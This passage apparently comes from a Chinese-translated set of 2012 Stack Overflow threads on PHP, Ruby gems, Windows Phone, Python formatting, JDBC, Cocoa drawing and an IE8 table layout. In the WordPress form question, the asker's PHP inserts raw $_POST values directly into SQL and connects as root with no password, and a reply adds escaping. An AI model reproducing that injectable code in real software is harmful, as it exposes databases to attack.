@ferhat ....谢谢链接。但是，我得到的错误是因为系统中没有安装**php5-curl 。**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T13:08:28.003

在此处查看示例 PHP-Elastica 应用程序； [https://github.com/searchbox-io/php-elastica-sample](https://github.com/searchbox-io/php-elastica-sample)

# java - 无法在mac上安装rjb，/System/Library/Frameworks/JavaVM.framework/Headers中没有头目录

> ID：13599627
> 
> 赞同：1
> 
> 时间：2012-11-28T07:07:19.043
> 
> 标签：java, rjb

我在mac上安装rjb的时候出现了一些错误，如下：Building native extensions。这可能需要一段时间... 错误：安装 rjb 时出错：错误：无法构建 gem 原生扩展。

```
 /Users/twer/.rvm/rubies/ruby-1.8.7-p352/bin/ruby extconf.rb

extconf.rb failed 
```

由于某种原因无法创建 Makefile，可能缺少必要的库和/或头文件。检查 mkmf.log 文件以获取更多详细信息。您可能需要配置选项。

提供的配置选项：

```
--with-opt-dir
    --without-opt-dir
    --with-opt-include
    --without-opt-include=${opt-dir}/include
    --with-opt-lib
    --without-opt-lib=${opt-dir}/lib
    --with-make-prog
    --without-make-prog
    --srcdir=.
    --curdir
    --ruby=/Users/twer/.rvm/rubies/ruby-1.8.7-p352/bin/ruby
extconf.rb:45:in `open': No such file or directory - /System/Library/Frameworks/JavaVM.framework/Headers (Errno::ENOENT)
    from extconf.rb:45 
```

Gem 文件将继续安装以`/Users/twer/.rvm/gems/ruby-1.8.7-p352@home-ideas/gems/rjb-1.3.3`供检查。结果记录到`/Users/twer/.rvm/gems/ruby-1.8.7-p352@home-ideas/gems/rjb-1.3.3/ext/gem_make.out`

然后我尝试安装Java开发包来解决这个问题。但是还是有的`no/System/Library/Frameworks/JavaVM.framework/Headers directory`。
请帮我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T07:33:36.640

我刚刚安装了 rjb，但我在 1.9.3-p327... 也许`rvm install 1.9.3-p327`看看你怎么样？

# windows-phone - 获取 Windows Phone 8 中所有已安装应用程序的列表

> ID：13599631
> 
> 赞同：3
> 
> 时间：2012-11-28T07:07:48.017
> 
> 标签：windows-phone, windows-phone-8

我是 Windows Phone 8 的新手。

我想使用 c# 获取 Windows Phone 8 中已安装应用程序的列表。

虽然我在旧版本中获得了一些示例，但我无法在 Windows Phone 8 中获取。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-29T01:43:18.100

此功能不适用于 Windows Phone 8 上的 3rd 方应用程序。您到底想做什么？[您可以使用 WP8 的 app2app 功能（用于纯文本的自定义协议和用于文件数据的文件扩展名](http://msdn.microsoft.com/en-us/library/windowsphone/develop/jj206987%28v=vs.105%29.aspx)）传递数据。

如果您有兴趣在未来的 WP 版本中看到此功能，请在[wpdev 用户语音](http://wpdev.uservoice.com)上打开一个新功能请求，并要求实现 Win8 [PackageManager](http://msdn.microsoft.com/en-us/library/windows/apps/br240969.aspx) API。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T18:33:33.037

据我所知，这是不可能的。您只能访问共享的其他应用程序（使用 DataTransferManager），即使那样您也只能将数据发送到其他应用程序，而不是接收数据。

# python - 如何在python中将数字作为具有一定位数的二进制字符串返回

> ID：13599638
> 
> 赞同：2
> 
> 时间：2012-11-28T07:08:14.910
> 
> 标签：python, binary

可能是一个愚蠢的问题，但在 python 中是否有一种简单的方法可以自动将带有零的数字填充到固定长度？我在 python 文档中找不到这个，但我可能还不够努力？ei 我希望 bin(4) 返回 00100，而不仅仅是 100。有没有一种简单的方法可以确保输出是 6 位而不是 3 位？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-28T07:12:12.377

字符串有一种`.zfill()`用零填充它的方法：

```
>>> '100'.zfill(5)
'00100' 
```

但是，对于二进制数，我会使用字符串格式：

```
>>> '{0:05b}'.format(4)
'00100' 
```

`:05b`格式化规范将传入的数字格式化为二进制，用 5 位数字填充，零填充。请参阅[Python 格式字符串语法](http://docs.python.org/2/library/string.html#format-string-syntax)。我在[`str.format()`](http://docs.python.org/2/library/stdtypes.html#str.format)这里使用过，但[内置`format()`函数](http://docs.python.org/2/library/functions.html#format)可以采用相同的格式化指令，减去`{0:..}`占位符语法：

```
>>> format(4, '05b')
'00100' 
```

如果你觉得这更容易。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-28T07:10:08.653

试试这个...

```
In [11]: x = 1

In [12]: print str(x).zfill(5)
00001

In [13]: bin(4)
Out[13]: '0b100'

In [14]: str(bin(4)[2:]).zfill(5)
Out[14]: '00100' 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-11-28T07:12:20.710

这是[*格式*](http://docs.python.org/2.7/library/functions.html#format)内置函数的工作：

```
>>> format(4, '05b')
'00100' 
```

# java - SQL连接异常

> ID：13599643
> 
> 赞同：1
> 
> 时间：2012-11-28T07:08:21.667
> 
> 标签：java, sql-server

连接 sqlserver(java) 时抛出以下错误。我不知道这个问题的根本原因。

```
CONNECTION URL :: jdbc:jtds:sqlserver://<IP>:<port>/DB2011;instance=TESTINST 

Caused by: java.sql.SQLException: I/O Error: Connection reset 
   at net.sourceforge.jtds.jdbc.TdsCore.nextToken(TdsCore.java:2277) 
   at net.sourceforge.jtds.jdbc.TdsCore.login(TdsCore.java:599) 
   at net.sourceforge.jtds.jdbc.ConnectionJDBC2.<init>(ConnectionJDBC2.java:331)
   at net.sourceforge.jtds.jdbc.ConnectionJDBC3.<init>(ConnectionJDBC3.java:50)
   at net.sourceforge.jtds.jdbc.Driver.connect(Driver.java:178) 
   at java.sql.DriverManager.getConnection(Unknown Source) 
   at java.sql.DriverManager.getConnection(Unknown Source) 
```

如果有人遇到这个问题，请告诉我们，如何解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T08:48:16.297

我前段时间遇到了这个异常，因为服务器无法处理更多连接。重新启动数据库解决了这个问题。

还有一次问题是我的笔记本电脑和数据库服务器之间的防火墙。防火墙必须允许我的 IP 通过。

# visual-studio-2012 - windows phone 8 模拟器和 Visual Studio 2012 问题

> ID：13599654
> 
> 赞同：1
> 
> 时间：2012-11-28T07:08:58.953
> 
> 标签：visual-studio-2012

我最近在我的机器（i3 处理器）上安装了 Windows 8，还在Windows 8 安装期间**启用了虚拟化的 BIOS 设置**。在 Visual express 试用版上创建示例应用程序，并尝试调试。模拟器启动并保持显示连接到模拟器.. 5 分钟后我收到错误消息（**Windows Phone 模拟器无法连接到 Windows Phone 操作系统。电话没有响应连接请求某些功能可能被禁用**) 我已**安装、运行 hyperV，**并且 UAC 设置为 Always Ask。还尝试**删除虚拟交换机并创建一个新的**，但同样的错误有人可以帮助我，似乎视觉工作室无法连接到模拟器并且它超时，但我看到**模拟器开关也获得了IP地址**，我哪里出错了。

非常感谢任何帮助。病毒性的

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-03T07:55:33.020

找到了解决方案，防病毒软件正在创建自己的防火墙并阻止对模拟器的访问。禁用 Windows 防火墙也无济于事，因为防病毒软件覆盖了 Windows 防火墙。Antivirus 是 Schematic 希望这对某人有所帮助。

# objective-c - Mac 应用程序 - NSImage drawInRect 的问题

> ID：13599656
> 
> 赞同：1
> 
> 时间：2012-11-28T07:09:04.960
> 
> 标签：objective-c, xcode, cocoa

使用 drawInRect 我得到不一致的结果

有时图像绘制正确，有时图像看起来像差了半个像素：

![在此处输入图像描述](../Images/75f14c5c09f7b4c10b9be649341a4a62.png)

在左上角，您会看到滑块的 cap 图像正常绘制，然后填充具有模糊的边缘，即使它们是使用相同的 x、y 绘制的……

```
// top cap
[topCap drawInRect:NSMakeRect(5, 5, 11, 7)
          fromRect:NSZeroRect
         operation:NSCompositeSourceOver
          fraction:1];

// background fill
[topFill drawInRect:NSMakeRect(5, 12, 11, (CGRectGetHeight(aRect) - 23))
           fromRect:NSZeroRect
          operation:NSCompositeSourceOver
           fraction:1]; 
```

左下箭头，同样的情况。

中心右箭头，类似情况。您可以看到左盖图像正确渲染，然后背景填充（1 像素宽的图像）变得模糊。

我想知道它是否与拉伸图像有关，因为看起来我试图用渲染不佳的矩形填充的图像。

感谢您的任何见解。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T08:34:55.467

如果您知道为什么 drawInRect 会扭曲图像，请留下答案。这是我发现解决此问题的方法：

对于我使用的某些区域`colorWithPatternImage`

```
NSColor* backgroundFill = [NSColor colorWithPatternImage:backgroundImage];
[backgroundFill set];
NSRectFill(background); 
```

我遇到的问题是图案原点设置为窗口而不是视图，因此有时图案会错位。

对于我使用的几个区域`NSDrawThreePartImage`，它们正确地平铺了图像而不扭曲它。即使我没有 3 张图片，我也只是将同一张图片放入 3 次。

# php - 如何删除这些警告

> ID：13599658
> 
> 赞同：0
> 
> 时间：2012-11-28T07:09:17.983
> 
> 标签：php, wordpress

我在 wordpress 中使用 Allow PHP in Post 和 Pages 插件，通过它我集成了一个表单

**警告：mysql_real_escape_string(): 21 在第 789 行的 ..wp-includes\wp-db.php 中不是有效的 MySQL-Link 资源**

**警告：mysql_error(): 21 在第 1102 行的 ..wp-includes\wp-db.php 中不是有效的 MySQL-Link 资源**

我的表格代码在这里

```
 $con = mysql_connect("localhost","root","");
if (!$con)
  {
  die('Could not connect: ' . mysql_error());
  }

mysql_select_db("form", $con);
$sql="INSERT INTO data (consignor,consignee, conveyance, origin, entry_port, importing_country, container_no, package_no, package_type, product_name, bot_name, quantity, certify, add_declaration, date,treatment, duration_temprature, concentration, add_information, inspector_name, place, name_designation, issue_date)
VALUES
('$_POST[exporter]', '$_POST[importer]', '$_POST[conveyance]', '$_POST[origin]', '$_POST[dpoe]', '$_POST[impcon]', '$_POST[container]', '$_POST[nopk]', '$_POST[tyop]', '$_POST[name]', '$_POST[botname]', '$_POST[quantity]', '$_POST[certify]', '$_POST[declaration]', '$_POST[date]', '$_POST[treatment]', '$_POST[dutemp]', '$_POST[concen]', '$_POST[adinfo]', '$_POST[insname]', '$_POST[place]', '$_POST[namedesg]', '$_POST[dateissue]')";

if (!mysql_query($sql,$con))
  {
  die('Error: ' . mysql_error());
  }
echo "Form Submitted";

mysql_close($con);
?>
<form action="#" method="post">
<table height ="200px" width="676" border="1" cellspacing="0" cellpadding="0">

<tr>
<td colspan="7" valign="top" width="676"> 
</td>
</tr>
<tr>
<td colspan="3" valign="top" width="320">1\. Exporter/Consignor (Name & Address)<br/>
<input type="text" name="exporter" />
</td>
<td colspan="4" valign="top" width="356">2\. Importer/Consignee (Name & Address)
 <input type="text" name="importer" />
</td>
</tr>
<tr>
<td colspan="3" valign="top" width="320">3\. Declared means of conveyance
<input type="text" name="conveyance" /></td>
<td colspan="4" valign="top" width="356">4\. Place of Origin<br/>
<input type="text" name="origin" /></td>
</tr>
<tr>
<td colspan="3" valign="top" width="320">5\. Declared Port of entry<br/>
<input type="text" name="dpoe" /></td>
<td colspan="4" valign="top" width="356">6\. Department of Plant Protection of Pakistan To Plant Protection Organization Of (importing country)<br/>
<input type="text" name="impcon" />
</td>
</tr>
<tr>
<td colspan="3" valign="top" width="320">7\. Distinguishing marks/Container No./ Seal No.<br/>
<input type="text" name="container" /></td>
<td colspan="3" valign="top" width="172">8\. No. of Packages<br/>
<input type="text" name="nopk" />
</td>
<td valign="top" width="184">9\. Type of packages<br/>
<input type="text" name="tyop" /></td>
</tr>
<tr>
<td valign="top" width="221">10\. Name of Product<br/>
<input type="text" name="name" /></td>
<td colspan="4" valign="top" width="233">11\. Botanical name of plant
<br/>
<input type="text" name="botname" />
</td>
<td colspan="2" valign="top" width="221">12\. Quantity<br/>
<input type="text" name="quantity" /></td>
</tr>
<tr>
<td colspan="7" valign="top" width="676">13\. This is to certify that the plants, plant products or other regulated articles described herein above have been inspected and/ or tested according to appropriate official procedures and are considered to be free from the quarantine pests, specified by the importing contracting party and to conform with the current phytosanitary requirements  of the importing contracting party including those for regulated non-quarantine pests.<br/>
<input type="checkbox" name="certify" value="Yes"/> Yes
<input type="checkbox" name="certify" value="No"/> No<br/>
 </td>
</tr>
<tr>
<td colspan="7" valign="top" width="676">14\. Additional Declaration
<br/>
<textarea name="declaration" cols="40" rows="2">Please limit your response to 200 characters.</textarea><br />
</td>
</tr>
<tr>
<td colspan="7" valign="top" width="676" bgcolor="grey">
<p align="center"><strong>Disinfestations and / or disinfection treatment </strong></p>
</td>
</tr>
<tr>
<td colspan="3" valign="top" width="320">15\. Date
<br/>
<input type="text" name="date" /></td>
<td colspan="4" valign="top" width="356">16\. Treatment<br/>
<input type="text" name="treatment" /></td>
</tr>
<tr>
<td colspan="3" valign="top" width="320">17\. Duration & Temperature
<br/>
<input type="text" name="dutemp" />
</td>
<td colspan="4" valign="top" width="356">18\. Concentration<br/>
<input type="text" name="concen" /></td>
</tr>
<tr>
<td colspan="3" valign="top" width="320">19\. Additional Information
<br/>
<textarea name="adinfo" cols="40" rows="2">Please limit your response to 200 characters.</textarea><br />
</td>
<td colspan="4" valign="top" width="356">20\. Name of Inspector<br/>
<input type="text" name="insname" /></td>
</tr>
<tr>
<td colspan="2" valign="top" width="240">21\. Stamps of Organization
<br></br><br></br>
 </td>
<td rowspan="2" colspan="2" valign="top" width="168">
<p align="right"><strong> </strong></p>
<p align="right"><strong> </strong></p>
<p align="right"><strong> </strong></p>
<p align="right"><strong> </strong></p>
<p align="right"><strong> </strong></p>
<p align="right"><strong> </strong></p>
<p align="right"><strong> </strong></p>
<p align="right"><strong> </strong></p>
<p align="right"><strong>PROGRESSIVE </strong></p>
</td>
<td rowspan="2" colspan="3" valign="top" width="340">23\. Place of issue<br/>
<input type="text" name="place" /><br/>
24\. Signature__________________________<br/><br></br>
25\. Name and designation of authorized officer
<input type="text" name="namedesg" /> <br/><br/>
26\. Date <br/>
<input type="text" name="dateissue" /></p></td>
</tr>
<tr>
<td colspan="2" valign="top" width="240">22\. No financial liability with respect to this certificate shall attach to department of plant protection or to any of its officers or representatives
<br></br></td>
</tr>
<tr>
<td width="221" border="0"></td>
<td width="19"></td>
<td width="80"></td>
<td width="48"><input type="submit" value="Submit Form" /></td>
<td width="47"><input type="reset" value="Reset" /></td>
<td width="137"></td>
<td width="220"></td>
</tr>
<tr><td></td>
<td></td>
<td></td>
<td align="right"></td>
</tr>
</table>
</form>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T07:13:34.463

在 wordpress 中，您不能使用普通的 mysql 系统调用数据库。您需要通过调用数据库

```
global $wpdb; 
```

有关更多示例，请参见此链接。[http://codex.wordpress.org/Class_Reference/wpdb](http://codex.wordpress.org/Class_Reference/wpdb)

***编辑***

尝试将您的 PHP 调用代码更改为类似的内容。

***编辑2***

添加一些代码以防止 sql 攻击。基本上将它们放入变量并转义它。

```
<?php
//no need to connect & close to db. it's done automatically by wpdb.
// the database MUST be the same with wordpress database. only different tables.
global $wpdb;

//protect your codes from attacks.
@ isset($_POST['exporter']) ? $exporter=$wpdb->escape($_POST['exporter']) : $exporter='';
@ isset($_POST['importer']) ? $importer=$wpdb->escape($_POST['importer']) : $importer='';
@ isset($_POST['conveyance']) ? $conveyance=$wpdb->escape($_POST['conveyance']) : $conveyance='';
//....
@ isset($_POST['dateissue']) ? $dateissue=$wpdb->escape($_POST['dateissue']) : $dateissue='';

if (!$wpdb->insert('data',
                        array(
                            'consignor'=>$exporter
                            ,'consignee'=>$importer
                            ,'conveyance'=>$conveyance
                            //...
                            ,'issue_date'=>$dateissue
                        ))) exit;
else {echo 'Form Submitted';}
?> 
```

# javascript - 当总宽度超过 100% 时表格单元格被隐藏

> ID：13599659
> 
> 赞同：24
> 
> 时间：2012-11-28T07:09:21.760
> 
> 标签：javascript, jquery, html, css

我有一个 HTML 表格，如下面的代码所示。这有 16 列。我正在使用 javascript 设置单元格宽度。当总宽度小于 100% 时，它工作正常。

当总宽度超过 100% 时，我想显示一个`horizontal scroll bar`. 但是当我将黄色突出显示的单元格的宽度从 5% 更改为 30% 时，所有剩余的单元格都被隐藏而不是滚动条的外观。

**问题**：

1.  为什么滚动条目前没有出现？
2.  我们如何通过展示使其正常工作`scroll bar`？（黄色列之后的两列也应该`visible`；不隐藏）

注意：该问题在**IE8**中注明。

注意：有关代码，请参阅[http://jsfiddle.net/Lijo/dYSfN/2/](http://jsfiddle.net/Lijo/dYSfN/2/)。这没有显示问题。为了可视化问题，请将代码复制到 html 文件中并使用 IE8 打开

**更新**

在`hiding a column`Firefox 和 Chrome 中，剩余的列宽度会自动调整为表格宽度，但在 IE8 中则不会。在 IE8 中，表格宽度`shrinks`。

[http://srikanthgade.blogspot.in/2010/09/ie8-standards-table-layout-fixed.html#!/2010/09/ie8-standards-table-layout-fixed.html](http://srikanthgade.blogspot.in/2010/09/ie8-standards-table-layout-fixed.html#!/2010/09/ie8-standards-table-layout-fixed.html)

问题详情

黄色高亮单元格宽度为 5% 时

![在此处输入图像描述](../Images/661d172a2e503f1c250580536ce949f1.png)

黄色高亮单元格宽度为 30% 时

![在此处输入图像描述](../Images/fe08c35e6fcbe3ade947379802fb4779.png)

**风格**

```
 .gridTableBorder
   {
        overflow:scroll;
        border: 2px solid green;
   }

    /*GridView Tables*/
    .resultGridTable
    {
        table-layout: fixed; /*Needed along with word wrap */
    }

    .resultGridTable th
    {
        background-color: #A7A7A6;
        color: #ffffff;
        padding: 2px 5px 2px 5px;
        font: bold 9pt Arial;
        border: 1px solid red;
        word-wrap: break-word;
    }

    .resultGridTable td
    {
        padding: 0px 5px 0px 5px;
        font: normal 9pt Arial;
        word-wrap: break-word;
        border: 1px solid blue;
    } 
```

**JAVASCRIPT**

```
 $(document).ready(function () {

        //Width Setting
        var numberOfColumns = 16;
        $('.resultGridTable th, .resultGridTable td').each(function (i) {

            if (i % numberOfColumns == 0) {
                $(this).css('width', '1%');
            }

            if (i % numberOfColumns == 1) {
                $(this).css('width', '10%');
            }

            if (i % numberOfColumns == 2) {
                $(this).css('width', '9%');

            }

            if (i % numberOfColumns == 3) {
                $(this).css('width', '8%');
                $(this).css('background-color', 'orange');
            }

            if (i % numberOfColumns == 4) {
                $(this).css('width', '6%');
            }
            if (i % numberOfColumns == 5) {
                $(this).css('width', '8%');
            }
            if (i % numberOfColumns == 6) {
                $(this).css('width', '5%');
            }
            if (i % numberOfColumns == 7) {
                $(this).css('width', '5%');
            }
            if (i % numberOfColumns == 8) {
                $(this).css('width', '5%');
            }

            ///
            if (i % numberOfColumns == 9) {
                $(this).css('width', '7%');
            }
            if (i % numberOfColumns == 10) {
                $(this).css('width', '8%');
                $(this).css('background-color', 'orange');
            }

            if (i % numberOfColumns == 11) {
                $(this).css('width', '5%');
            }
            if (i % numberOfColumns == 12) {
                $(this).css('width', '5%');
            }

            if (i % numberOfColumns == 13) {
                $(this).css('width', '30%');
                $(this).css('background-color', 'Yellow');
            }

            if (i % numberOfColumns == 14) {
                $(this).css('width', '7%');
            }

            if (i % numberOfColumns == 15) {
                $(this).css('width', '7%');
            }

        }
        );

        //Hide Is Summary Row Column
        var selectedElements = $("tr").find("th:first, td:first");
        $(selectedElements).hide();

    }
    ); 
```

**HTML**

```
<body>
<form method="post" action="LocalTaxReport.aspx" id="form1">
<div id="wrapper">
    <div id="container">
        <div id="centralContainer">
            <div id="mainContainer">
                <div id="contentHolderDiv" class="contentHolderDiv">
                    <div id="resultContainer" class="resultContainerDiv">
                        <div id="gridDiv" class="gridTableBorder">
                            <div>
                                <table class="resultGridTable" cellspacing="0" id="detailContentPlaceholder_grdLocalTaxReport"
                                    style="border-collapse: collapse;">
                                    <tr>
                                        <th scope="col">
                                            IsSummaryRow
                                        </th>
                                        <th scope="col">
                                            Associate
                                        </th>
                                        <th scope="col">
                                            My Amount
                                        </th>
                                        <th scope="col">
                                            Federal Withholding
                                        </th>
                                        <th scope="col">
                                            Social Security
                                        </th>
                                        <th scope="col">
                                            Medicaring
                                        </th>
                                        <th scope="col">
                                            State Tax
                                        </th>
                                        <th scope="col">
                                            County Tax
                                        </th>
                                        <th scope="col">
                                            City Tax
                                        </th>
                                        <th scope="col">
                                            Total
                                        </th>
                                        <th scope="col">
                                            State
                                        </th>
                                        <th scope="col">
                                            State Code
                                        </th>
                                        <th scope="col">
                                            County
                                        </th>
                                        <th scope="col">
                                            County Code
                                        </th>
                                        <th scope="col">
                                            City
                                        </th>
                                        <th scope="col">
                                            City Code
                                        </th>
                                    </tr>
                                    <tr>
                                        <td>
                                            False
                                        </td>
                                        <td>
                                            Mary Dryden
                                        </td>
                                        <td>
                                            $3450
                                        </td>
                                        <td>
                                            $32
                                        </td>
                                        <td>
                                            $5
                                        </td>
                                        <td>
                                            $2
                                        </td>
                                        <td>
                                            $10
                                        </td>
                                        <td>
                                            $1
                                        </td>
                                        <td>
                                            $2
                                        </td>
                                        <td>
                                            $3400
                                        </td>
                                        <td>
                                            Arkansas
                                        </td>
                                        <td>
                                            AR
                                        </td>
                                        <td>
                                            Benton
                                        </td>
                                        <td>
                                            04567
                                        </td>
                                        <td>
                                            Bentonville
                                        </td>
                                        <td>
                                            23156
                                        </td>
                                    </tr>
                                </table>
                            </div>
                        </div>
                    </div>
                    <div class="clear">
                    </div>
                </div>
            </div>
            <div class="clear">
            </div>
        </div>
    </div>
</div>
</form>

 <script type="text/javascript" src="http://ajax.aspnetcdn.com/ajax/jquery/jquery-1.4.1.js"></script>

</body> 
```

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-11-30T21:53:22.453

我试图通过很少的修改来达到你想要的效果，我将在这里描述它。

1.  您需要设置`doctype`. DOCTYPE 声明对于大多数当前的标记语言都是强制性的，没有它就不可能可靠地验证文档或确定要应用哪些规则。

2.  您看不到滚动条，因为未设置表格的宽度。div 默认采用`100%`. 现在将`overflow`属性设置为 div，然后将表格的宽度设置为`120%`（超过 div 的`100%`）以查看滚动条。

3.  表宽`120%`并不意味着您可以将所有列宽之和为`120`. 由于，即使您将表格宽度设置为`table-layout:fixed`，您也需要将所有列宽度的总和计算为。`100``120%`

4.  在您的代码中，您设置了所有列和行的宽度，而不是将宽度仅应用于`th`或将应用于所有行中的所有列（整个表）的第一行。

5.  将您的代码从使用修改`if..if..if`为使用`if..else if..else if`

**注意：** 4 和 5 是对现有代码的改进。

**演示：http:** [//jsfiddle.net/FP7MF/2/embedded/result/](http://jsfiddle.net/FP7MF/2/embedded/result/)

**完整代码：**

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head id="Head1">
    <title>My Report </title>
    <style type="text/css">

        /*GridView Tables*/
        .resultGridTable
        {
            table-layout: fixed; 
            width: 130%;
        }

        .resultGridTable th
        {
            background-color: #A7A7A6;
            color: #ffffff;
            padding: 2px 5px 2px 5px;
            font: bold 9pt Arial;
            border: 1px solid red;
            word-wrap: break-word;
        }

        .resultGridTable td
        {
            padding: 0px 5px 0px 5px;
            font: normal 9pt Arial;
            word-wrap: break-word;
            border: 1px solid blue;
        }

        #gridDiv div { overflow: auto;  }

    </style>
</head>
<body>
    <form>
        <div id="wrapper">
            <div id="container">
                <div id="centralContainer">
                    <div id="mainContainer">
                        <div id="contentHolderDiv" class="contentHolderDiv">
                            <div id="resultContainer" class="resultContainerDiv">
                                <div id="gridDiv" class="gridTableBorder">
                                    <div>
                                        <table class="resultGridTable" cellspacing="0" id="detailContentPlaceholder_grdLocalTaxReport"
                                             style="border-collapse: collapse;">
                                           <tr>
                                              <th scope="col">IsSummaryRow</th>
                                              <th scope="col">Associate</th>
                                              <th scope="col">My Amount</th>
                                              <th scope="col">Federal Withholding</th>
                                              <th scope="col">Social Security</th>
                                              <th scope="col">Medicaring</th>
                                              <th scope="col">State Tax</th>
                                              <th scope="col">County Tax</th>
                                              <th scope="col">City Tax</th>
                                              <th scope="col">Total</th>
                                              <th scope="col">State</th>
                                              <th scope="col">State Code</th>
                                              <th scope="col">County</th>
                                              <th scope="col">County Code</th>
                                              <th scope="col">City</th>
                                              <th scope="col">City Code</th>
                                           </tr>
                                           <tr>
                                               <td>False</td>
                                               <td>Mary Dryden</td>
                                               <td>$3450</td>
                                               <td>$32</td>
                                               <td>$5</td>
                                               <td>$2</td>
                                               <td>$10</td>
                                               <td>$1</td>
                                               <td>$2</td>
                                               <td>$3400</td>
                                               <td>Arkansas</td>
                                               <td>AR</td>
                                               <td>Benton</td>
                                               <td>04567</td>
                                               <td>Bentonville</td>
                                               <td>23156</td>
                                            </tr>
                                        </table>
                                    </div>
                                </div>
                            </div>
                            <div class="clear"></div>
                        </div>
                    </div>
                    <div class="clear"></div>
               </div>
            </div>
        </div>
    </form>
    <script type="text/javascript" src="http://ajax.aspnetcdn.com/ajax/jquery/jquery-1.4.1.js"></script>

    <script type="text/javascript">

        $(document).ready(function () {

            //Width Setting
            var numberOfColumns = 16;
            $('.resultGridTable th').each(function (i) {

                if (i % numberOfColumns == 0) {
                    $(this).css('width', '1%');
                } else if (i % numberOfColumns == 1) {
                    $(this).css('width', '10%');
                } else if (i % numberOfColumns == 2) {
                    $(this).css('width', '9%');
                } else if (i % numberOfColumns == 3) {
                    $(this).css({'width': '8%', 'background-color': 'orange'});
                } else if (i % numberOfColumns == 4) {
                    $(this).css('width', '6%');
                } else if (i % numberOfColumns == 5) {
                    $(this).css('width', '8%');
                } else if (i % numberOfColumns == 6) {
                    $(this).css('width', '5%');
                } else if (i % numberOfColumns == 7) {
                    $(this).css('width', '5%');
                } else if (i % numberOfColumns == 8) {
                    $(this).css('width', '5%');
                } else if (i % numberOfColumns == 9) {
                    $(this).css('width', '7%');
                } else if (i % numberOfColumns == 10) {
                    $(this).css({'width': '8%', 'background-color': 'orange'});
                } else if (i % numberOfColumns == 11) {
                    $(this).css('width', '5%');
                } else if (i % numberOfColumns == 12) {
                    $(this).css('width', '5%');
                } else if (i % numberOfColumns == 13) {
                    $(this).css({'width': '8%', 'background-color': 'Yellow'});
                } else if (i % numberOfColumns == 14) {
                    $(this).css('width', '5%');
                } else if (i % numberOfColumns == 15) {
                    $(this).css('width', '5%');
                }

            });

            //Hide Is Summary Row Column
            var selectedElements = $("tr").find("th:first, td:first");
            $(selectedElements).hide();
        });

    </script>
</body>
</html> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-30T11:11:36.077

这不是一个完美的解决方案，但是将表格宽度设置为 120% 并将列宽更改为表格宽度的百分比（因此它们总和为 100%）可以达到预期的效果。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-28T11:44:32.773

如果我错了，请原谅我，但这不能通过`overflow:scroll;`为包含表格的 div 添加为 css 规则来解决吗？

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-01T13:15:16.493

如果我们需要在 IE8 中保持表格布局不变，则需要在隐藏列后添加以下解决方法：

```
:
:
$(selectedElements).hide();

// Add the workaround after the above line (or when hiding of columns is done).
$(".resultGridTable").attr("style","display:inline-table;");
window.setTimeout(function(){$(".resultGridTable").attr("style","");},0); 
```

这是 IE8 中的一个错误，但微软似乎没有对任何解决方案做出回应。如果您发现任何信息，请在此处发布。

但是我已经尝试了解决方法，但它仍然没有提供所需的输出。

只是在这里添加它，以便它可能有助于更多的研发。

参考：

[http://social.msdn.microsoft.com/Forums/en-US/iewebdevelopment/thread/f265c5b1-a45d-4949-85b2-86a97a884dc1/](http://social.msdn.microsoft.com/Forums/en-US/iewebdevelopment/thread/f265c5b1-a45d-4949-85b2-86a97a884dc1/)

解决方法：

[当列隐藏在具有 table-layout:fixed 的表中时，IE8 不会调整 tbody 或 thead 的大小](https://stackoverflow.com/questions/2654103/ie8-isnt-resizing-tbody-or-thead-when-a-column-is-hidden-in-a-table-with-table)

[http://srikanthgade.blogspot.in/2010/09/ie8-standards-table-layout-fixed.html](http://srikanthgade.blogspot.in/2010/09/ie8-standards-table-layout-fixed.html)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-12-05T07:15:08.693

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
<style type="text/css">
.gridTableBorder
   {
        overflow:scroll;
        border: 2px solid green;
   }

    /*GridView Tables*/
    .resultGridTable
    {
        /*table-layout: fixed;*/ /*Needed along with word wrap */
    }

    .resultGridTable th
    {
        background-color: #A7A7A6;
        color: #ffffff;
        padding: 2px 5px 2px 5px;
        font: bold 9pt Arial;
        border: 1px solid red;
        /*word-wrap: break-word;*/
    }

    .resultGridTable td
    {
        padding: 0px 5px 0px 5px;
        font: normal 9pt Arial;
        /*word-wrap: break-word;*/
        border: 1px solid blue;
    }
</style>
<script type="text/javascript" src="http://ajax.aspnetcdn.com/ajax/jquery/jquery-1.4.1.js"></script>
<script type="text/javascript">

$(document).ready(function () {

        //Width Setting
        var numberOfColumns = 16;
        $('.resultGridTable th, .resultGridTable td').each(function (i) {

            if (i % numberOfColumns == 0) {
                $(this).css('width', '1%');
            }

            if (i % numberOfColumns == 1) {
                $(this).css('width', '10%');
            }

            if (i % numberOfColumns == 2) {
                $(this).css('width', '9%');

            }

            if (i % numberOfColumns == 3) {
                $(this).css('width', '8%');
                $(this).css('background-color', 'orange');
            }

            if (i % numberOfColumns == 4) {
                $(this).css('width', '6%');
            }
            if (i % numberOfColumns == 5) {
                $(this).css('width', '8%');
            }
            if (i % numberOfColumns == 6) {
                $(this).css('width', '5%');
            }
            if (i % numberOfColumns == 7) {
                $(this).css('width', '5%');
            }
            if (i % numberOfColumns == 8) {
                $(this).css('width', '5%');
            }

            ///
            if (i % numberOfColumns == 9) {
